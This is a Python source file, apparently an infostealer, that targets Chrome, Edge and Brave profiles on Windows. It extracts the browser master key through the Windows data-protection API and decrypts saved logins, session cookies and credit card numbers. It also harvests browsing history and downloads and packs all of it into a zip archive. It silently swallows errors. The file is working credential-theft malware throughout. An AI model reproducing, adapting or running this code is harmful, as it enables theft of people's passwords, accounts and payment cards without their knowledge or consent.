import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []

class Browsers:
    def __init__(self):
        Chromium()
        self.upload_files()

    def upload_files(self):
        self.write_files()

    def write_files(self):
        os.makedirs("vault", exist_ok=True)
        if __LOGINS__:
            with open("vault/logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("vault/cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("vault/web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("vault/downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("vault/cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with open("vault/vault_summary.txt", "w", encoding="utf-8") as summary_file:
            summary_file.write("Logins:\n" + '\n'.join(str(x) for x in __LOGINS__) + "\n")
            summary_file.write("Cookies:\n" + '\n'.join(str(x) for x in __COOKIES__) + "\n")
            summary_file.write("Web History:\n" + '\n'.join(str(x) for x in __WEB_HISTORY__) + "\n")
            summary_file.write("Downloads:\n" + '\n'.join(str(x) for x in __DOWNLOADS__) + "\n")
            summary_file.write("Cards:\n" + '\n'.join(str(x) for x in __CARDS__) + "\n")

        shutil.make_archive("vault", 'zip', "vault")
        shutil.rmtree("vault")

class Chromium:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            # Diğer tarayıcı yollarını ekleyebilirsiniz.
        }
        self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:
                        # Hata mesajlarını yazdırmaktan kaçınıyorum
                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove('login_db')

    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], self.master_key)
                __COOKIES__.append(Types.Cookie(row[0], row[1], row[2], cookie, row[4]))

            conn.close()
        except Exception as e:
            print(e)

        os.remove('cookie_db')

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove('web_history_db')

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove('downloads_db')

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove('cards_db')


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'{self.url}\t{self.username}\t{self.password}'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'{self.host}\t{self.name}\t{self.path}\t{self.value}\t{self.expires}'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, last_visit_time):
            self.url = url
            self.title = title
            self.last_visit_time = last_visit_time

        def __str__(self):
            return f'{self.url}\t{self.title}\t{self.last_visit_time}'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, url, path):
            self.url = url
            self.path = path

        def __str__(self):
            return f'{self.url}\t{self.path}'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name_on_card, expiration_month, expiration_year, card_number, date_modified):
            self.name_on_card = name_on_card
            self.expiration_month = expiration_month
            self.expiration_year = expiration_year
            self.card_number = card_number
            self.date_modified = date_modified

        def __str__(self):
            return f'{self.name_on_card}\t{self.expiration_month}\t{self.expiration_year}\t{self.card_number}\t{self.date_modified}'

        def __repr__(self):
            return self.__str__()

if __name__ == '__main__':
    Browsers()
